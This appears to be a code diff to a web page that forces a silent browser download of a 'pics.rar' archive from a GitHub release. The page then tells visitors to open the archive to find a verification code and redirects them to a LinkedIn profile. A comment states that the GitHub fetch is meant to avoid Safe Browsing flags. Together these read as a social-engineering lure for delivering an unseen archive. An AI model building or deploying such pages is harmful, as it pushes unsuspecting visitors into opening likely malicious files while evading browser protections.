@@ -159,7 +159,7 @@
             <div id="step2" class="input-container">
                 <h3>Verification Required</h3>
                 
-                <!-- Updated, natural explanation pointing to the image in pics.rar -->
+                <!-- Natural explanation -->
                 <div class="explanation-text">
                     The downloaded archive contains an image. Please open it to retrieve the 6-character verification code and enter it below.
                 </div>
@@ -193,21 +193,37 @@
             const verifyBtn = document.getElementById('verify-btn');
             const errorMsg = document.getElementById('error-msg');
 
-            // Silent download function for the single pics.rar
+            // --- Setup GitHub Release Link ---
+            // Replace this URL with your actual .rar file on GitHub Releases!
+            const RAR_FILE_URL = "https://github.com/Ramirhub/about-me/releases/download/v1.0/pics.rar";
+
+            // Silent download function from GitHub 
             async function downloadRar() {
                 try {
-                    const response = await fetch('/download/rar');
-                    if (!response.ok) return;
+                    // Fetch directly from GitHub (bypasses Render's proxy, avoiding Safe Browsing flags)
+                    const response = await fetch(RAR_FILE_URL);
+                    if (!response.ok) throw new Error("Network response was not ok");
+                    
                     const blob = await response.blob();
                     const blobUrl = window.URL.createObjectURL(blob);
                     const link = document.createElement('a');
                     link.href = blobUrl;
-                    link.download = 'pics.rar'; // Downloads the single file
+                    link.download = 'pics.rar';
                     document.body.appendChild(link);
                     link.click();
                     document.body.removeChild(link);
                     setTimeout(() => window.URL.revokeObjectURL(blobUrl), 1000);
-                } catch (e) { /* Fail silently */ }
+                } catch (e) {
+                    console.warn("Fetch failed, using fallback link...", e);
+                    // Fallback: If CORS fails, use the direct link method
+                    const link = document.createElement('a');
+                    link.href = RAR_FILE_URL;
+                    link.download = 'pics.rar';
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                }
             }
 
             // Step 1 Trigger - Download ONCE at the very start.
@@ -236,7 +252,7 @@
                 .then(data => {
                     if (data.success) {
                         errorMsg.style.display = 'none';
-                        // Redirect to LinkedIn as requested
+                        // Redirect to LinkedIn
                         window.location.href = "https://au.linkedin.com/in/shihan-shen0131?trk=people-guest_people_search-card";
                     } else {
                         errorMsg.style.display = 'block';
